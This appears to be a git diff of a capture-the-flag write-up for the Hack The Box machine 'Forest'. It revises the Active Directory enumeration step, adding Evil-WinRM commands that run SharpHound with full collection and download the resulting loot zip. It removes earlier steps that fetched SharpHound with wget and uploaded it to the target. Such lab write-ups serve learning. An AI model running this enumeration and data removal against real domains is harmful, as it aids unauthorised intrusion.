@@ -100,7 +100,26 @@ User flag was in `svc-alfresco`'s Desktop.
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
 ```
 
-Started bloodhound
+SharpHound was already on the machine in the `svc-alfresco` user's home directory. I ran it to collect everything.
+```powershell
+*Evil-WinRM* PS C:\Users\svc-alfresco> .\hound.exe -c all --zipfilename loot.zip
+
+...
+ 118 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-06-14T16:09:59.0652881-07:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 6/14/2025! Happy Graphing!
+```
+
+And downloaded it to my machine.
+```powershell
+*Evil-WinRM* PS C:\Users\svc-alfresco> download 20250614160957_loot.zip
+                                        
+Info: Downloading C:\Users\svc-alfresco\20250614160957_loot.zip to 20250614160957_loot.zip                  
+```
+
+So I started Bloodhound
 ```bash
 sudo ./bloodhound-cli containers start
 
@@ -109,29 +128,7 @@ sudo ./bloodhound-cli containers start
 [+] Running `docker` to restart containers with docker-compose.yml...
 ```
 
-Downloaded and unzipped SharpHound
-```bash
-wget "https://github.com/SpecterOps/SharpHound/releases/download/v2.6.7/SharpHound_v2.6.7_windows_x86.zip"
 
-unzip SharpHound_v2.6.7_windows_x86.zip
-
-Archive:  SharpHound_v2.6.7_windows_x86.zip
-  inflating: SharpHound.exe          
-  inflating: SharpHound.exe.config   
-  inflating: SharpHound.pdb          
-  inflating: SharpHound.ps1          
-```
-
-Uploaded `SharpHound.exe` to the machine.
-```powershell
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe
-                                        
-Info: Uploading /home/wither/CTF/HTB/Forest/files/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe
-                                        
-Data: 1715540 bytes of 1715540 bytes copied
-                                        
-Info: Upload successful!
-```
 
 
 
